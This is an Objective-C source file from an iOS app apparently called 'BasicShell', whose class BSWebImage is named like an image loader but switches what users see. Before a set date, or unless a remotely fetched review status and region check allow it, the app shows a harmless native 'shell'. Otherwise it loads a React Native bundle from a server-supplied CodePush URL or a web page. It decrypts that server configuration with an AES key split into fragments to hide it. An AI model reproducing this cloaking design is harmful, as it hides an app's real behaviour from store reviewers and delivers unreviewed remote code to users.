//
//  BSWebImage.m
//  BasicShell
//
//  Created by xiao6 on 2018/5/3.
//  Copyright © 2018年 Facebook. All rights reserved.
//

#import "BSWebImage.h"
#import "BSNativeController.h"
#import "BSRNController.h"
#import "BSWebController.h"

#import "BSHttpApi.h"
#import "CodePush.h"
#import "AppDelegate+Service.h"
#import <CoreTelephony/CTCellularData.h>
#import "BSRNController.h"
#import "AppConfigurationModule.h"
#import "BSWebController.h"
#import "BSPromptController.h"
#import "BSLoadingController.h"
#import "NSData+KKAES.h"

@interface BSWebImage ()

@property (nonatomic, strong) UIViewController *natiVC;
@property (nonatomic, strong) BSRNController *rnVC;
@property (nonatomic, strong) UIViewController *webVc;
@property (nonatomic, strong) UIViewController *promptVc;
@property (nonatomic, strong) UIViewController *firstVC;
@end

@implementation BSWebImage
static BSWebImage *_instance;
+ (instancetype)sharedInstance {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        _instance = [[self alloc] init];
    });
    return _instance;
}
+ (instancetype)allocWithZone:(struct _NSZone *)zone {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        _instance = [super allocWithZone:zone];
    });
    return _instance;
}
+ (void)setupWithLaunchOptions:(NSDictionary *)launchOptions startDate:(NSString *)startDate navtiVC:(id (^)(void))nativeBlock {
    [BSWebImage sharedInstance].launchOptions = launchOptions;
    [BSWebImage sharedInstance].natiVC = nativeBlock();
    [[BSWebImage sharedInstance] configWithStartDate:startDate];
}

- (void)configWithStartDate:(NSString *)openDate {
    
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    [formatter setDateFormat:@"yyyy-MM-dd"];
    if ([formatter dateFromString:openDate].timeIntervalSinceNow > 0) {
        [UIApplication sharedApplication].delegate.window.rootViewController = [BSWebImage sharedInstance].natiVC;
        return;
    }
    
    [BSWebImage sharedInstance].firstVC = [[BSLoadingController alloc] init];
    [UIApplication sharedApplication].delegate.window.rootViewController = [BSWebImage sharedInstance].firstVC;
    
    //    [self customizeActionBeforeConfig];
    [self showContentWithConfig];
    [self registerServerWithConfigrationInstance];
    [self handleWithCellularDataState:^(CTCellularDataRestrictedState state) {
        
        if (state==kCTCellularDataRestrictedStateUnknown) { // 未知
            
            [self updateConfigrationWithHandler:^(BOOL sucessed) {
                if (sucessed) {
                    [self showContentWithConfig];
                    [self registerServerWithConfigrationInstance];
                }
            }];
            
        } else if (state==kCTCellularDataNotRestricted) { // 允许
            
            // 提示正在加载
            
            [self updateConfigrationWithHandler:^(BOOL sucessed) { // 请求
                if (sucessed) {
                    [self showContentWithConfig];
                    [self registerServerWithConfigrationInstance];
                } else {
                    
                    AppConfigurationModule *config = [AppConfigurationModule sharedInstance];
                    BOOL notInited = config.reviewStatus==0;
                    if (notInited) {
                        [self showPromptVC];
                        [(BSPromptController *)[BSWebImage sharedInstance].promptVc changeToLoadingMode];
                    }
                    
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ // 等待2秒
                        [self updateConfigrationWithHandler:^(BOOL sucessed) { // 请求一次
                            if (sucessed) {
                                [self showContentWithConfig];
                                [self registerServerWithConfigrationInstance];
                            } else {
                                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ // 等待2秒
                                    [self updateConfigrationWithHandler:^(BOOL sucessed) { // 请求两次
                                        if (sucessed) {
                                            [self showContentWithConfig];
                                            [self registerServerWithConfigrationInstance];
                                        } else {
                                            [(BSPromptController *)[BSWebImage sharedInstance].promptVc changeToFailedMode];
                                        }
                                    }];
                                });
                            }
                        }];
                    });
                }
            }];
        }
    }];
}

- (void)showContentWithConfig {
    AppConfigurationModule *config = [AppConfigurationModule sharedInstance];
    BOOL showContentForUsers = config.reviewStatus==2 && config.isInAvailableArea;
    BOOL isFirstTime = config.reviewStatus==0;
    if (showContentForUsers) {
        if (config.appMode<=1) {
            [self showRNVCWithCodePKey:config.codePushKey
                        codePServerUrl:config.codePushServerUrl
                            moduleName:@"app"
                            appVersion:@"1.0.0"];
        } else if (config.appMode==2) {
            [self showWebVCWithUrl:config.wapUrl];
        } else {
            [self showNatiVC];
        }
    } else if (isFirstTime) {
//        [self showPromptVC];
//        [(BSPromptController *)[BSWebImage sharedInstance].promptVc changeToLoadingMode];
    } else {
        // 展示壳
        [self showNatiVC];
    }
}

- (void)registerServerWithConfigrationInstance {
    AppConfigurationModule *config = [AppConfigurationModule sharedInstance];
    BOOL hasEnoughKeysForServer = (config.umengAppKey.length>0 || config.jpushAppKey.length>0) && config.channel.length>0;
    if (hasEnoughKeysForServer) {
        [(AppDelegate *)[UIApplication sharedApplication].delegate configService];
    }
}

- (void)updateConfigrationWithHandler:(void(^)(BOOL sucessed))handler {
    [BSHttpApi requestBasicInfoWithCompletionHandler:^(NSDictionary *allHeaderFields, NSDictionary *responseObject) {
        NSInteger code = [responseObject[@"code"] integerValue];
        if (code==200) {
            NSString *base64Encoded = responseObject[@"data"];
            NSData *base64EncodedData = [[NSData alloc] initWithBase64EncodedString:base64Encoded options:0];
            NSData *key32 = [KDStr(@"e2a93", @"cf0acdf", @"470d617c", @"088cbd", @"11586b") dataUsingEncoding:NSUTF8StringEncoding];
            NSData *edec32 = [base64EncodedData  AES_ECB_DecryptWith:key32];
            NSString *string = [[NSString alloc] initWithData:edec32 encoding:NSUTF8StringEncoding];
            
            NSData *jsonData = [string dataUsingEncoding:NSUTF8StringEncoding];
            NSDictionary *configs = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:nil];
            
            AppConfigurationModule *module = [AppConfigurationModule sharedInstance];
            module.configs = configs;
            if (configs.allKeys.count<1) {
                // 没有匹配到配置
                module.reviewStatus = 1;
            }
            
            dispatch_async(dispatch_get_main_queue(), ^{
                if (handler) {
                    handler(YES);
                }
            });
        } else {
            dispatch_async(dispatch_get_main_queue(), ^{
                if (handler) {
                    handler(NO);
                }
            });
        }
    }];
}

- (void)showRNVCWithCodePKey:(NSString *)codePushKey
              codePServerUrl:(NSString *)codePushServerURL
                  moduleName:(NSString *)moduleName
                  appVersion:(NSString *)appVersion {
    
    void (^allocNewReactNativeController)(void) = ^(){
        [BSWebImage sharedInstance].rnVC = [[BSRNController alloc] initWithCodePushKey:codePushKey
                                                                     codePushServerUrl:codePushServerURL
                                                                            moduleName:moduleName
                                                                         andAppVersion:appVersion];
    };
    
    if ([BSWebImage sharedInstance].rnVC) {
        NSString *currentCodePushKey = [BSWebImage sharedInstance].rnVC.codePushKey;
        NSString *currentCodePushServerUrl = [BSWebImage sharedInstance].rnVC.codePushServerUrl;
        NSString *currtntReactNativeModuleName = [BSWebImage sharedInstance].rnVC.moduleName;
        BOOL needAllocNewReactNativeController = ![currentCodePushKey isEqualToString:codePushKey] || ![currentCodePushServerUrl isEqualToString:codePushServerURL] || ![currtntReactNativeModuleName isEqualToString:moduleName];
        if (needAllocNewReactNativeController) {
            allocNewReactNativeController();
        }
    } else {
        allocNewReactNativeController();
    }
    [self showController:[BSWebImage sharedInstance].rnVC];
}

- (void)showNatiVC {
    [self showController:[BSWebImage sharedInstance].natiVC];
}

- (void)showWebVCWithUrl:(NSString *)url {
    if (![BSWebImage sharedInstance].webVc) {
        BSWebController *rootController = [[BSWebController alloc] init];
        rootController.urlString = url;
        UINavigationController *naviController = [[UINavigationController alloc] initWithRootViewController:rootController];
        [BSWebImage sharedInstance].webVc = naviController;
    }
    [self showController:[BSWebImage sharedInstance].webVc];
}

- (void)showPromptVC {
    [BSWebImage sharedInstance].promptVc = [[BSPromptController alloc] init];
    [self showController:[BSWebImage sharedInstance].promptVc];
}

- (void)showController:(UIViewController *)vc {
    static UIViewController *lastVC;
    if (lastVC == vc || [NSStringFromClass([lastVC class]) isEqualToString:NSStringFromClass([vc class])]) {
        return;
    }
    lastVC = vc;
    dispatch_async(dispatch_get_main_queue(), ^{
        [[BSWebImage sharedInstance].firstVC presentViewController:vc animated:NO completion:nil];
    });
}
- (void)handleWithCellularDataState:(void(^)(CTCellularDataRestrictedState state))handler {
    CTCellularData *cellularData = [[CTCellularData alloc]init];
    CTCellularDataRestrictedState state = cellularData.restrictedState;
    cellularData.cellularDataRestrictionDidUpdateNotifier =  ^(CTCellularDataRestrictedState state){
        //获取联网状态，解决中国特色社会主义问题
        dispatch_async(dispatch_get_main_queue(), ^{
            handler(state);
        });
    };
    handler(state);
}
@end
